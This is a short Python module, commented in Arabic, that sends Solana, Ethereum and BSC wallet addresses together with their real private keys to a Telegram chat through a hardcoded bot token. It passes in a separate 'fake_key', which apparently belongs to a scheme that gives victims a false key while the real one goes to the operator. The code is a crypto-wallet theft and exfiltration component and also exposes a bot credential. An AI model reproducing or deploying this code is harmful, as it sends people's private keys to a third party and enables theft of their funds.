import requests
from datetime import datetime

TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
CHAT_ID = None

def get_chat_id():
    """يجيب Chat ID من آخر رسالة للبوت"""
    global CHAT_ID
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        r = requests.get(url, timeout=5)
        data = r.json()
        if data.get('result'):
            for update in data['result']:
                if 'message' in update:
                    CHAT_ID = update['message']['chat']['id']
                    return CHAT_ID
    except:
        pass
    return None

def send_message(text):
    if not CHAT_ID:
        get_chat_id()
    if CHAT_ID:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
            requests.post(url, json=data, timeout=5)
        except:
            pass

def notify_new_wallet(network, address, real_key, fake_key):
    emoji = {"solana": "⚡", "ethereum": "💎", "bsc": "🔷"}.get(network, "💰")
    
    message = f"""
🦅 <b>محفظة جديدة!</b>
────────────────────
🌐 الشبكة: {emoji} {network.upper()}
🏦 العنوان: <code>{address}</code>
🔑 المفتاح: <code>{real_key}</code>
⏱️ {datetime.now().strftime('%Y-%m-%d %H:%M')}
    """
    send_message(message)
